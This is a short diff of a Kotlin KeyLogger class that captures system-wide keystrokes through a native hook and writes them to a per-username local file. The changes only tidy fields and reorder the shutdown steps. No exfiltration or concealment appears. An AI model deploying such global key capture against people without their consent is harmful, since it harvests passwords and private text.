@@ -13,12 +13,8 @@ import kotlin.concurrent.thread
 import kotlin.system.exitProcess
 
 class KeyLogger(username: String) : Logger, NativeKeyListener {
-
-    private var startTime = 0L
-
     private val mPathToFile = "${System.getProperty("user.dir")}/data/${username}_Keys.txt"
 
-    @Volatile
     private var mFile = File(mPathToFile)
 
     @Volatile
@@ -38,8 +34,6 @@ class KeyLogger(username: String) : Logger, NativeKeyListener {
 
         setFile()
 
-        startTime = System.currentTimeMillis()
-
         GlobalScreen.addNativeKeyListener(this)
     }
 
@@ -51,11 +45,10 @@ class KeyLogger(username: String) : Logger, NativeKeyListener {
     }
 
     override fun stop() {
-        GlobalScreen.removeNativeKeyListener(this)
-        // Causes System.exit(1) on Arch and Mint :)
-
         clearQueue()
 
+        GlobalScreen.removeNativeKeyListener(this)
+        // Causes System.exit(1) on Arch and Mint :)
         GlobalScreen.unregisterNativeHook()
     }
 
